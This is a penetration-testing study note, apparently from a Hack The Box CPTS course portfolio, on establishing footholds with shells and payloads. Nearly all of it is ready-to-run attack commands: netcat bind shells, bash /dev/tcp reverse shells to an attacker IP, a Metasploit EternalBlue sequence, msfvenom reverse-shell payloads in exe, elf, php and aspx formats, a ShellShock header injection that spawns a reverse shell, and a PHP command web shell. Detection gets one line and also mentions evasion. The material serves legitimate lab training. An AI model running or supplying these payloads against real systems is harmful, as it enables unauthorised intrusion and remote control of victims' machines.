# 08 — Shells & Payloads

> **Path Phase:** Exploitation | **Difficulty:** Medium | **Sections:** 17

Establishing footholds via bind/reverse shells, MSFvenom payloads, and web shells.

> ℹ️ `<YOUR_IP>` = attacker, `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Shells & Payloads Intro
2. CAT5 Security's Engagement Preparation
3. Anatomy of a Shell
4. Bind Shells
5. Reverse Shells
6. Introduction to Payloads
7. Automating Payloads & Delivery with Metasploit
8. Crafting Payloads with MSFvenom
9. Infiltrating Windows
10. Infiltrating Unix/Linux
11. Spawning Interactive Shells
12. Introduction to Web Shells
13. Laudanum
14. Antak Webshell
15. PHP Web Shells
16. The Live Engagement
17. Detection & Prevention

---

## 4 — Bind Shells
```bash
# Target listens:
nc -lvnp 4444 -e /bin/bash
# Attacker connects:
nc -nv {TARGET} 4444
```

## 5 — Reverse Shells
```bash
# Attacker listener:
nc -lvnp 443
# Target (Linux):
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1'
```
Reference: revshells.com

## 6–7 — Payloads & Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {TARGET}
set LHOST <YOUR_IP>
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

## 8 — Crafting Payloads with MSFvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=443 -f raw -o shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f aspx -o shell.aspx
# Catch:
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 443; run"
```

## 9 — Infiltrating Windows
```bash
nmap --script smb-vuln-ms17-010 -p 445 {TARGET}
```
> **Windows foothold:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 10 — Infiltrating Unix/Linux
```bash
# ShellShock example:
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1'" http://{TARGET}/cgi-bin/test.cgi
```
> **Linux foothold:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 11 — Spawning Interactive Shells
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg
export TERM=xterm
```

## 12–15 — Web Shells
```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
# Trigger: http://{TARGET}/cmd.php?cmd=id
# Laudanum: /usr/share/laudanum/ | Antak (ASP.NET, Nishang)
```

## 16 — The Live Engagement
```bash
nmap -sV -sC -p- {TARGET}
# → identify service → matching payload → catch shell
```
> **Engagement:** ✅ Completed in lab (flags withheld per HTB Academy policy)

## 17 — Detection & Prevention
EDR/AV signatures, egress filtering, monitoring suspicious child processes. Evasion: encoding, encryption, custom payloads.

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `netcat` | Bind/reverse shell listener |
| `msfvenom` | Payload generation |
| `msfconsole` | Exploitation + multi/handler |
| Web shells | Laudanum, Antak, PHP |

## 🔑 Key Takeaways
- **Reverse shells** beat bind shells against firewalled targets.
- MSFvenom format must match the target (exe/elf/php/aspx).
- Always upgrade to a full TTY immediately.
- Match the web shell language to the server (PHP vs ASPX).

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
